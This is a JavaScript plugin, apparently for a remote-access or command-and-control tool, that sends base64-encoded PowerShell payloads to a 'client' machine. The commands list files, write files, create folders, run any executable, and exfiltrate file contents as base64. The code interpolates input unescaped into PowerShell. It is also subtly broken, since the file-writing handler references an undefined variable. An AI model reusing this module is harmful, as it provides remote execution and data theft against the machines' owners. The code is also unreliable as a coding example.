// Register a plugin
module.exports = {
    name: 'File Manager',
    type: 'client',
    description: 'A client plugin to manage and manipulate files and folders.',
    commands: {
        files: {
            name: 'files',
            method: 'payload-ps',
            description: `<folderPath> Get the list files in a directory.`,
            parameters: {
                'folderPath': 'The path to the folder to show files. e.g. C:\\'
            },
            handler: (props) => {
                return Buffer.from(`Get-ChildItem -Path ${props[0]} -Force`).toString('base64');
            }
        },
        file: {
            name: 'file',
            method: 'payload-ps',
            description: `<folderPath> <fileName> Create a file in a directory.`,
            parameters: {
                'folderPath': 'The path to the folder to show files. e.g. C:\\',
                'fileName': 'The name of the file with the extension. e.g. NewFile.txt'
            },
            handler: (props) => {
                const toUint8Array = (fileContent) => {
                    let data = null;
                    if (fileContent.includes('"')) {
                        data = `'${fileContent.replace(/^"(.*)"$/, '$1')}'`;
                    } else {
                        const buffer = new TextEncoder().encode(fileContent).buffer;
                        if (ArrayBuffer.isView(buffer)) {
                            data = new Uint8Array(Buffer.from(fileContent));
                        }
                    }
                    return data;
                };
                return Buffer.from(`${toUint8Array(properties[1])} | Out-File -FilePath '${properties[0]}' -Force`).toString('base64');
            }
        },
        folder: {
            name: 'folder',
            method: 'payload-ps',
            description: `<folderPath> <folderName> Create a folder in a directory.`,
            parameters: {
                'folderPath': 'The path to where the folder will be created. e.g. C:\\',
                'folderName': 'The name of the folder to create. e.g. NewFolder'
            },
            handler: (props) => {
                return Buffer.from(`New-Item -Path '${props[0]}' -ItemType 'directory'`).toString('base64');
            }
        },
        run: {
            name: 'run',
            method: 'payload-ps',
            description: `<filePath> Runs a file from the console.`,
            parameters: {
                'filePath': 'The path to the file to run. e.g. C:\\run.exe or calc.exe'
            },
            handler: (props) => {
                return Buffer.from(props[0]).toString('base64');
            }
        },
        download: {
            name: 'download',
            method: 'payload-ps',
            description: '<filePath> Downloads a file from the client.',
            parameters: {
                'filePath': 'The path to the file to download. e.g. C:\\file.exe'
            },
            handler: (props) => {                
                return Buffer.from(
                    `([PSCustomObject]@{download=[IO.Path]::GetFileName("${props[0]}");data=[Convert]::ToBase64String([IO.File]::ReadAllBytes("${props[0]}"))}) | ConvertTo-Json`
                ).toString('base64');
            }
        }
    }
};